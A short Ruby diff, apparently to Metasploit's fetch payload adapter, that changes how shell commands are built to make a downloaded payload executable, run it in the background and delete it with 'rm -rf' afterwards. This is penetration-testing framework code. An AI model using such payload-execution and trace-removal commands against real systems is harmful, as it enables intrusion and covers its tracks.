@@ -203,8 +203,12 @@ module Msf::Payload::Adapter::Fetch
 
   def _execute_nix
     cmds = "; chmod +x #{_remote_destination_nix}"
-    cmds << "; #{_remote_destination_nix} &"
-    cmds << ";rm -rf #{_remote_destination_nix}" if datastore['FETCH_DELETE']
+    if datastore['FETCH_DELETE']
+      cmds << "; (#{_remote_destination_nix} &)"
+      cmds << ";rm -rf #{_remote_destination_nix}"
+    else
+      cmds << "; #{_remote_destination_nix} &"
+    end
     cmds
   end
 
